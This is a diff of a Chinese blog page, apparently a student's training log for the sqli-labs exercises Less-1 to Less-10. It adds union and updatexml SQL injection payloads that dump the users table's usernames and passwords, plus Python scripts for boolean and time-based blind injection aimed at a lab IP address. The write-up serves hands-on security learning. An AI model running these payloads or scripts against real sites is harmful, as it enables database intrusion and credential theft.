@@ -6,13 +6,12 @@
     <meta charset="utf-8">
     <meta name="keywords" content="&#39;实训记录2&#39;, 计算机视觉、QRCODE">
     <meta name="description" content="sql注入漏洞过程记录less-1
+使用联合注入找寻注入点
 
 
 
 
-less-2
-less-3
-
+1payload：-1&amp;#x27; union select 1,2,group_concat(username,password) from users  --+
 
 
 
@@ -388,14 +387,14 @@ less-3
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-03-26
+                    2025-03-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    14
+                    1.1k
                 </div>
                 
 
@@ -421,16 +420,61 @@ less-3
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="sql注入漏洞过程记录"><a href="#sql注入漏洞过程记录" class="headerlink" title="sql注入漏洞过程记录"></a>sql注入漏洞过程记录</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143725764.png" alt="image-20250325143725664"></p>
+<p>使用联合注入找寻注入点</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143754654.png" alt="image-20250325143754575"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143916023.png" alt="image-20250325143915816"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325144749936.png" alt="image-20250325144749855"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325145350073.png" alt="image-20250325145349996"></p>
-<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326132222674.png" alt="image-20250326132215520"></p>
-<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326132646011.png" alt="联想截图_20250325171159"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326132713232.png" alt="联想截图_20250325171234"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326132913662.png" alt="联想截图_20250325171259"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326132929390.png" alt="联想截图_20250325171736"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326132949993.png" alt="联想截图_20250325234225"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：-1&#x27; union select 1,2,group_concat(username,password) from users  --+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327113226215.png" alt="image-20250327113226028"></p>
+<p>和less-1类似，但是是数字型注入，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;; --+</span><br><span class="line">?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; --+</span><br><span class="line">?id=0 union select 1,group_concat(username),group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>首先进行探测</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114007867.png" alt="image-20250327114007777"></p>
+<p>发现没有闭合，试着闭合联合注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114203001.png" alt="image-20250327114202757"></p>
+<p>成功显示，其余步骤和less-2一样,payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username,password) from users --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114553871.png" alt="image-20250327114553664"></p>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>探测发现为”)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115650261.png" alt="image-20250327115649991"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115630462.png" alt="image-20250327115630386"></p>
+<p>其余payload和less-3一样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115745312.png" alt="image-20250327115745058"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: id=-1&quot;) union select 1,2,group_concat(username,password) from users --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115958757.png" alt="image-20250327115958516"></p>
+<p>发现只有报错没有回显，报错注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327120056740.png" alt="image-20250327120056474"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121123340.png" alt="image-20250327121123265"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121559502.png" alt="image-20250327121559237"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121642167.png" alt="image-20250327121641937"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">id=1&#x27; and updatexml(0x7e,concat(0x7e,database()),0x7e) --+</span><br><span class="line">id=-1&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),0x7e) --+</span><br><span class="line">id=-1&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;)),0x7e) --+</span><br><span class="line">id=-1&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(username) from users)),0x7e) --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>报错注入和less-5类似，不同点在双引号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121930809.png" alt="image-20250327121930723"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121957339.png" alt="image-20250327121957109"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">id = -1&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(username) from users)),0x7e) --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>探测发现为中文单引号闭合</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327122530913.png" alt="image-20250327122530841"></p>
+<p>提示写入文件</p>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>根据csdn复现，布尔盲注、脚本攻击等</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327123109498.png" alt="image-20250327123109343"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database</span>(<span class="params">url</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 初始化一个空字符串用于存储数据库名</span></span><br><span class="line">    letters = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&amp;*&#x27;</span>  <span class="comment"># 包含可能的字符列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环每个数据库名的字符位置</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):  <span class="comment"># 假设数据库名最长为20个字符</span></span><br><span class="line">        <span class="comment"># 循环尝试每个可能的字符</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">            <span class="comment"># 构造盲注payload</span></span><br><span class="line">            payload = <span class="string">&quot;1&#x27; AND SUBSTRING((SELECT DATABASE()), %d, 1) = &#x27;%s&#x27;-- &quot;</span> % (i, j)</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            res = requests.get(url, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;)</span><br><span class="line">            <span class="comment"># 检查响应是否包含特定字符串，即数据库名</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="comment"># 找到一个字符后，将其添加到数据库名中</span></span><br><span class="line">                name += j</span><br><span class="line">                <span class="built_in">print</span>(name)  <span class="comment"># 打印当前已获取的数据库名</span></span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 跳出当前循环，继续下一个位置的字符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL</span></span><br><span class="line">url = <span class="string">&#x27;http://49.232.171.41/Less-8/&#x27;</span></span><br><span class="line"><span class="comment"># 调用函数获取数据库名</span></span><br><span class="line">db_name = get_database(url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Database Name:&quot;</span>, db_name)</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>确定是闭合方式为单引号的时间盲注</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327123726170.png" alt="image-20250327123725961"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://49.232.171.41/Less-9/&quot;</span> <span class="comment">#填入url</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r =<span class="number">130</span></span><br><span class="line">    mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;?id=1&#x27; and if((ascii(substr((select group_concat(username,password) from security.users),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        time1 = datetime.datetime.now()<span class="comment">#获取请求前的时间</span></span><br><span class="line">        html = requests.get(url+<span class="built_in">str</span>)</span><br><span class="line">        time2  = datetime.datetime.now()<span class="comment">#获取请求后的时间</span></span><br><span class="line">        c = (time2-time1).seconds<span class="comment">#两个时间相减得到页面延迟</span></span><br><span class="line">        <span class="built_in">print</span>(url+<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">if</span> c &gt;=<span class="number">2</span>:<span class="comment">#因为sleep(2)所以这就是我们比对的依据</span></span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span>,result)</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>确定是闭合方式为双引号的时间盲注，对less-9脚本稍作修改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8077/sql/Less-10/&quot;</span> <span class="comment">#填入url</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r =<span class="number">130</span></span><br><span class="line">    mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;?id=1\&quot; and if((ascii(substr((select group_concat(username,password) from security.users),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        time1 = datetime.datetime.now()<span class="comment">#获取请求前的时间</span></span><br><span class="line">        html = requests.get(url+<span class="built_in">str</span>)</span><br><span class="line">        time2  = datetime.datetime.now()<span class="comment">#获取请求后的时间</span></span><br><span class="line">        c = (time2-time1).seconds<span class="comment">#两个时间相减得到页面延迟</span></span><br><span class="line">        <span class="built_in">print</span>(url+<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">if</span> c &gt;=<span class="number">2</span>:<span class="comment">#因为sleep(2)所以这就是我们比对的依据</span></span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span>,result)</span><br></pre></td></tr></table></figure>
+
 
                 
             </div>
@@ -575,18 +619,17 @@ less-3
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2025/03/25/shi-xun-ji-lu-2/">
+                <a href="/2025/03/26/shi-xun-ji-lu-3/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="&#39;实训记录2&#39;">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="&#39;实训记录3&#39;">
                         
-                        <span class="card-title">&#39;实训记录2&#39;</span>
+                        <span class="card-title">&#39;实训记录3&#39;</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -596,9 +639,9 @@ less-3
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-25
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-26
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -606,15 +649,6 @@ less-3
                             
                         </span>
                     </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Sql%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">Sql注入</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -652,6 +686,14 @@ less-3
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SQL/">
+                        <span class="chip bg-color">SQL</span>
+                    </a>
+                    
                 </div>
                 
             </div>
